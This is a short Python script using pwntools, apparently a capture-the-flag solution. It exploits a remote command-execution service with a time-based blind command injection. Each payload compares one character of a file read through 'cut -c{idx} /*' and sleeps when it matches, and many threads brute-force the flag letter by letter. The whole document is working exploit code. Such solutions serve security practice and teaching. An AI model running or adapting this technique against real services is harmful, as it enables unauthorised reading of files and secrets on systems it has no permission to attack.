import pwn
import string
import sys
import time
from threading import Thread

bruteforce_pool = string.ascii_lowercase + string.digits + "}{_"
keys = {}
for c in bruteforce_pool:
    keys[c] = 0

def check(ip, port, idx, c):
    global keys
    io = pwn.remote(ip, port, level="error")
    payload = f'[ `cut -c{idx} /*` = {c} ]&&sleep 9'
    io.sendlineafter(b"Enter command to execute: ", payload.encode())
    output = io.recvuntil(b"Your command is done!", timeout=1)
    if b"Your command is done!" not in output:
        keys[c] = 1
    io.close()

def main(ip, port):
    global keys
    flag = ""
    logging = pwn.log.progress('Flag')
    while not flag.endswith("}"):
        # run simultaneous connections for each possible character
        threads = list()
        for c in bruteforce_pool:
            t = Thread(target=check, args=(ip, port, len(flag) + 1, c))
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

        # check for false positives or no output
        counter = 0
        for i in keys:
            if keys[i]:
                counter += 1
        if counter != 1:
            for i in keys: keys[i] = 0
            time.sleep(1)
            continue

        # get correct value
        for k in keys:
            if keys[k]:
                flag += k
                logging.status(flag)
                keys[k] = 0
                break
    logging.success(flag)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage:")
        print(f"\t{sys.argv[0]} IP PORT")
        exit(0)
    main(sys.argv[1], sys.argv[2])
